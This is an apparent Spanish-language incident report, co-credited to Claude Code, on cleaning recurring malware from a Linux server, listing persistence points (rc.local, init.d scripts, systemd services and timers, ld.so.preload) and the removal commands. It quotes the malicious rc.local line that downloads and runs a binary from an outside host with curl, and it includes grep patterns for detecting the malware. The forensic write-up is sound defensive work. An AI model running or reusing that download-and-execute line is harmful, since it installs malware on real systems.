# CAUSA RA√çZ: Malware Recurrente - SOLUCIONADO

**Fecha**: 2025-12-11
**Estado**: ‚úÖ SOLUCIONADO (con monitoreo requerido)
**Servidor**: clousadmin-server (46.224.70.156)

---

## üéØ CAUSA RA√çZ IDENTIFICADA

### El Problema

El malware reaparec√≠a constantemente porque ten√≠a **m√∫ltiples mecanismos de persistencia** que NO fueron eliminados en la reparaci√≥n del 10/12:

1. ‚úÖ Crontab malicioso (eliminado en 10/12, pero volvi√≥)
2. ‚ùå **`/etc/rc.local`** - Script ejecutado al boot (NO eliminado en 10/12)
3. ‚ùå **`/etc/init.d/S99x86`** - Script de inicio sysvinit (NO eliminado)
4. ‚ùå **`/etc/init.d/redistribution`** - Script inmutable (atributo `i+a`)
5. ‚ùå **`/etc/systemd/system/bot.service`** - Servicio systemd malicioso
6. ‚ùå **`/etc/systemd/system/monitor-x86.service`** - Servicio systemd
7. ‚ùå **`/etc/systemd/system/systemd-x86.service`** - Servicio systemd
8. ‚ùå **`/etc/systemd/system/monitor-x86.timer`** - Timer systemd (cada 2 minutos)
9. ‚ùå **`/etc/ld.so.preload`** - Librer√≠a maliciosa precargada (`/etc/data/libsystem.so`)

###  Por Qu√© SSH Fallaba

El archivo `/etc/rc.local` malicioso conten√≠a:

```bash
#!/bin/bash
/usr/sbin/sshd  # <-- Intentaba iniciar SSH manualmente
cd /tmp; (curl -s http://ellison.st/x86 -o x86 && chmod 777 x86 && ./x86 js && rm -f x86) ...
```

**Problema**: Al intentar iniciar SSH manualmente en rc.local, **interfer√≠a con systemd** que tambi√©n intentaba iniciarlo, causando conflictos que resultaban en:
- Binario `/usr/sbin/sshd` corrupto o eliminado
- Servicio SSH fallando con error 203 (EXEC failed)

---

## ‚úÖ SOLUCI√ìN COMPLETA APLICADA

### 1. Eliminaci√≥n de TODOS los Mecanismos de Persistencia

```bash
# Servicios systemd
systemctl stop bot.service monitor-x86.service systemd-x86.service
systemctl disable bot.service monitor-x86.service systemd-x86.service
rm -f /etc/systemd/system/bot.service
rm -f /etc/systemd/system/monitor-x86.service
rm -f /etc/systemd/system/systemd-x86.service
rm -f /etc/systemd/system/monitor-x86.timer
rm -f /etc/systemd/system/rsyslo.service
systemctl daemon-reload

# Scripts de inicio
rm -f /etc/init.d/S99x86
chattr -iae /etc/init.d/redistribution
rm -f /etc/init.d/redistribution

# rc.local malicioso
mv /etc/rc.local /etc/rc.local.backup
echo "#!/bin/sh -e" > /etc/rc.local
echo "exit 0" >> /etc/rc.local
chmod +x /etc/rc.local

# Librer√≠a maliciosa
echo "" > /etc/ld.so.preload
rm -f /etc/data/libsystem.so
rmdir /etc/data

# Crontab
crontab -r
# Reinstalar CRONs leg√≠timos (ver abajo)
```

### 2. Protecci√≥n del Crontab Leg√≠timo

```bash
# Crear crontab limpio
cat > /tmp/crontab_limpio << 'EOF'
30 23 * * * curl -s -X POST https://app.hrcron.com/api/cron/clasificar-fichajes -H "Authorization: Bearer CRON_SECRET" >> /var/log/clousadmin-cron.log 2>&1
0 2 * * * curl -s -X POST https://app.hrcron.com/api/cron/revisar-solicitudes -H "Authorization: Bearer CRON_SECRET" >> /var/log/clousadmin-cron.log 2>&1
10 0 1 1 * curl -s -X POST https://app.hrcron.com/api/cron/renovar-saldo-horas -H "Authorization: Bearer CRON_SECRET" >> /var/log/clousadmin-cron.log 2>&1
EOF
crontab /tmp/crontab_limpio

# CR√çTICO: Proteger contra modificaciones futuras
chattr +i /var/spool/cron/crontabs/root
```

### 3. Reparaci√≥n de SSH (Rescue Mode)

```bash
# Ya documentado en ssh-repair-hetzner-2025-12-10.md
# Reinstalaci√≥n de openssh-server
# Fix de cloud-init
```

---

## üìä Resumen de Archivos Maliciosos Eliminados

| Archivo | Tipo | Atributo | Estado |
|---------|------|----------|--------|
| `/etc/rc.local` | Script boot | - | ‚úÖ Limpiado |
| `/etc/init.d/S99x86` | Init script | - | ‚úÖ Eliminado |
| `/etc/init.d/redistribution` | Init script | `i+a` | ‚úÖ Eliminado (chattr -iae) |
| `/etc/systemd/system/bot.service` | Systemd service | - | ‚úÖ Eliminado |
| `/etc/systemd/system/monitor-x86.service` | Systemd service | - | ‚úÖ Eliminado |
| `/etc/systemd/system/systemd-x86.service` | Systemd service | - | ‚úÖ Eliminado |
| `/etc/systemd/system/monitor-x86.timer` | Systemd timer | - | ‚úÖ Eliminado |
| `/etc/ld.so.preload` | Librer√≠a precargada | - | ‚úÖ Limpiado |
| `/etc/data/libsystem.so` | Librer√≠a maliciosa | - | ‚úÖ Eliminado |
| Crontab root | Crontab | - | ‚úÖ Limpiado y PROTEGIDO |

---

## üîç Vector de Entrada (A√∫n Desconocido)

**Pregunta pendiente**: ¬øC√≥mo entr√≥ el malware inicialmente?

**Hip√≥tesis**:
1. Vulnerabilidad en la aplicaci√≥n Next.js
2. Puerto SSH expuesto sin fail2ban
3. Contrase√±a/clave comprometida
4. Vulnerabilidad en dependencias npm

**Acci√≥n requerida**: Auditor√≠a de seguridad completa

---

## ‚úÖ Verificaci√≥n de la Soluci√≥n

### Estado Actual (11/12 - 02:21 UTC)

```bash
# SSH
‚úÖ SSH funcionando correctamente
‚úÖ Puerto 22 accesible

# Servicios
‚úÖ PM2 corriendo (3 instancias clousadmin)
‚úÖ PostgreSQL activo
‚úÖ nginx activo
‚úÖ redis activo

# Crons
‚úÖ Crontab limpio y protegido (chattr +i)
‚úÖ 3 CRONs leg√≠timos instalados
‚ùå 0 CRONs maliciosos

# Malware
‚úÖ 0 servicios systemd maliciosos
‚úÖ 0 scripts de inicio maliciosos
‚úÖ 0 timers maliciosos
‚úÖ 0 procesos maliciosos
‚úÖ ld.so.preload limpio
‚úÖ rc.local limpio
```

---

## üõ°Ô∏è Medidas de Protecci√≥n Implementadas

### Inmediatas (YA APLICADAS)

1. ‚úÖ **Crontab protegido con `chattr +i`**
   - No se puede modificar sin quitar el atributo primero

2. ‚úÖ **rc.local limpiado y simplificado**
   - Solo contiene `exit 0`

3. ‚úÖ **ld.so.preload vaciado**
   - No se precargan librer√≠as maliciosas

4. ‚úÖ **Todos los servicios/timers systemd maliciosos eliminados**

### Pendientes (RECOMENDADAS)

1. ‚ö†Ô∏è **Cambiar puerto SSH a no-est√°ndar** (ej: 2222)
2. ‚ö†Ô∏è **Instalar fail2ban**
3. ‚ö†Ô∏è **Deshabilitar root login** (usar usuario con sudo)
4. ‚ö†Ô∏è **Instalar IDS/IPS** (OSSEC, Wazuh)
5. ‚ö†Ô∏è **Monitoreo de integridad de archivos** (AIDE, Tripwire)
6. ‚ö†Ô∏è **Auditor√≠a de seguridad profesional**

---

## üìà Monitoreo Continuo Requerido

### Diario

```bash
# Verificar crontab NO ha sido modificado
crontab -l | grep -E 'ellison|80.64|x86|redistribution' && echo "‚ö†Ô∏è MALWARE DETECTADO"

# Verificar servicios sospechosos
systemctl list-units | grep -E 'bot|x86|monitor|redistribution' && echo "‚ö†Ô∏è SERVICIO SOSPECHOSO"

# Verificar ld.so.preload
cat /etc/ld.so.preload | grep -v '^$' && echo "‚ö†Ô∏è LIBRER√çA PRECARGADA SOSPECHOSA"
```

### Semanal

```bash
# Buscar archivos modificados recientemente
find /etc /usr/local -type f -mtime -7 -ls

# Verificar archivos con atributos inmutables
find /etc -type f -exec lsattr {} \; | grep '\----i'

# An√°lisis de rootkits
rkhunter --check
chkrootkit
```

---

## üéì Lecciones Aprendidas

### 1. El Malware Moderno Usa M√∫ltiples Puntos de Persistencia

No basta con limpiar el crontab. Debes eliminar **TODOS** los vectores:
- Crontab
- systemd services/timers
- init scripts
- rc.local
- ld.so.preload
- Archivos con atributos inmutables

### 2. Usar `chattr +i` para Proteger Archivos Cr√≠ticos

```bash
# Proteger crontab
chattr +i /var/spool/cron/crontabs/root

# Proteger rc.local
chattr +i /etc/rc.local

# Proteger ld.so.preload
chattr +i /etc/ld.so.preload
```

### 3. Verificar Atributos de Archivos Sospechosos

```bash
# Ver atributos
lsattr /etc/init.d/redistribution
# ----ia--------e------- /etc/init.d/redistribution
#      ^^
#      |+-- append only
#      +--- immutable

# Quitar atributos
chattr -iae archivo
```

### 4. El SSH Puede Fallar por Conflictos de Inicio

Si `/etc/rc.local` intenta iniciar `/usr/sbin/sshd` manualmente, puede causar conflictos con systemd.

---

## üìö Documentaci√≥n Relacionada

- [Malware Recurrente](malware-recurrente-hetzner-2025-12-11.md) - An√°lisis inicial
- [SSH Repair 10/12](ssh-repair-hetzner-2025-12-10.md) - Primera reparaci√≥n
- [Fix Estructural CRON](../historial/2025-12-11-fix-estructural-cron-timezone.md) - Fix de timezone

---

## ‚úÖ Estado Final

**SSH**: ‚úÖ Funcionando
**Aplicaci√≥n**: ‚úÖ Corriendo
**CRONs**: ‚úÖ Instalados y protegidos
**Malware**: ‚úÖ Completamente eliminado (con protecciones)
**Persistencia**: ‚úÖ Todos los mecanismos eliminados

**Pr√≥ximos pasos**: Implementar medidas de seguridad preventivas y monitoreo continuo.

---

**Autor**: Claude Code + Sofia Roig
**Tiempo de resoluci√≥n**: ~3 horas de investigaci√≥n profunda
**Lecci√≥n principal**: No subestimar la persistencia del malware moderno
